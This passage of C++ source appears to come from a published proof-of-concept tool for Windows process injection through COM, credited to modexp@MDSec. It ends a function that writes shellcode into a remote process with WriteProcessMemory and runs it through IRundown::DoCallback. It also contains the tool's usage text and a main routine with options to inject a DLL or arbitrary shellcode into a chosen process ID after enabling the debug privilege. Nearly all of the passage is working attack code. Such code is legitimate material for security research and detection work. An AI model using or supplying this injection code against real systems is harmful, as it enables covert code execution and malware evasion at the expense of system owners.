            result = WriteProcessMemory(
                hp,
                rc.pfnCallback,
                pic.data(),
                pic.size(),
                NULL
            );
        }
    }
    //
    // We don't need an process handle to execute the code, so it's safe to close now.
    //
    CloseHandle(hp);

    //
    // If the shellcode is inside the remote process...
    //
    if (result) {
        //
        // Execute using IRundown::DoCallback()
        //
        result = invoke_docallback(cc, &rc);
    }
    return result;
}

void
usage(void) {
    printf("\n");
    printf("usage: com_inject.exe <PID | Process Name> [options]\n");
    printf("    -l                  List interfaces.\n");
    printf("    -v                  List all interfaces with -l.\n");
    printf("    -m                  Use CoGetObject instead of CoUnmarshalInterface to establish channel.\n");
    printf("    -d <path>           Inject DLL into notepad. Specify full path.\n");
    printf("    -s <path>           Inject PIC/Shellcode into target process.\n");
    printf("\n");

    exit(0);
}

int
wmain(int argc, wchar_t* argv[]) {
    COM_CONTEXT cc = { 0 };

    printf("\n");
    printf("Process Injection via COM. PoC by modexp@MDSec\n");
    printf("Built on " __DATE__ " at " __TIME__ " for " __TARGET_ARCH__ "-Bit\n\n");

    //
    // Parse arguments.
    //
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] != L'/' && argv[i][0] != L'-') {
            cc.pid = name2pid(argv[i]);
            if (!cc.pid) {
                cc.pid = wcstoul(argv[i], NULL, 10);
            }
            if (!cc.pid) {
                printf("unable to resolve PID for \"%lS\"\n", argv[i]);
                return 0;
            }
            continue;
        }

        wchar_t opt = argv[i][1];

        switch (opt) {
            // Inject DLL
        case L'd':
            if (!argv[i][2]) { i++; cc.path = argv[i]; }
            else cc.path = &argv[i][2];
            cc.inject_dll = true;
            break;
            // Inject shellcode
        case L's':
            if (!argv[i][2]) { i++; cc.path = argv[i]; }
            else cc.path = &argv[i][2];
            cc.inject_pic = true;
            break;
            // List interfaces (only shows IRundown)
        case L'l':
            cc.list_ipid = true;
            break;
            // Use objref for binding
        case L'm':
            cc.use_objref = true;
            break;
            // List all interfaces.
        case L'v':
            cc.verbose = true;
            break;
        }
    }

    //
    // We need at least one action.
    //
    if (!cc.inject_dll &&
        !cc.inject_pic &&
        !cc.list_ipid) {
        usage();
        return 0;
    }

    //
    // Initialise COM
    //
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    //
    // Try obtain the information required to invoke IRundown::DoCallback()
    //
    bool result = init_cc(&cc);

    printf("\n");
    printf("CProcessSecret::s_guidOle32Secret : %08lX\n", cc.secret);
    printf("g_pMTAEmptyCtx                    : %08lX\n", cc.server_ctx);;
    printf("CIPIDTable::_palloc               : %08lX\n", cc.ipid_tbl);
    printf("offsetof(tagOXIDEntry, OXID)      : %08lX\n", cc.oxid);

    printf("Initialisation                    : %s\n\n", result ? "OK" : "FAILED");

    if (!result) {
        return 0;
    }
    //
    // We try emable the debug privilege, but it's not required for all processes.
    //
    if (!EnableDebugPrivilege()) {
        //printf("WARNING: Enabling SeDebugPrivilege failed.\n");
    }

    //
    // List instances of IRundown in target process?
    //
    if (cc.list_ipid) {
        printf("Listing IPID entries.\n");
        ListIPID(&cc);
    }
    else {
        //
        // Make sure DLL or shellcode exists.
        //
        DWORD attr = GetFileAttributesW(cc.path.c_str());

        if (attr == INVALID_FILE_ATTRIBUTES) {
            printf("\"%lS\" for %lS injection cannot be found...\n",
                cc.path.c_str(),
                cc.inject_dll ? L"DLL" : L"shellcode"
            );
        }
        else {
            //
            // Inject DLL into notepad.exe with IRundown::DoCallback
            //
            if (cc.inject_dll) {
                printf("DLL injection : %s\n", inject_dll(&cc) ? "OK" : "FAILED");
            }
            else
                //
                // Inject shellcode into arbitrary process with IRundown::DoCallback
                //
                if (cc.inject_pic) {
                    if (!cc.pid) {
                        printf("COM injection with shellcode requires a process ID.\n");
                    }
                    else {
                        printf("Shellcode injection : %s\n", inject_pic(&cc) ? "OK" : "FAILED");
                    }
                }
        }
    }
    CoUninitialize();
    return 0;
}

